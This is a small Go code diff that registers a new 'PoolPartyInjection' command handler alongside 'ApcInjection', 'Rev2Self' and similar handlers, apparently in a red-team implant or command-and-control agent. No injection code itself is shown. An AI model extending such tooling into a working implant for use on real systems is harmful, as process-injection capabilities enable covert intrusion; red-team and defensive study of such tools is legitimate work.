@@ -48,6 +48,7 @@ func Initialize() {
 		RegisterCommand(&Rev2SelfCommand{})
 		RegisterCommand(&TsCommand{})
 		RegisterCommand(&ApcInjectionCommand{})
+		RegisterCommand(&PoolPartyInjectionCommand{})
 	}
 
 	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
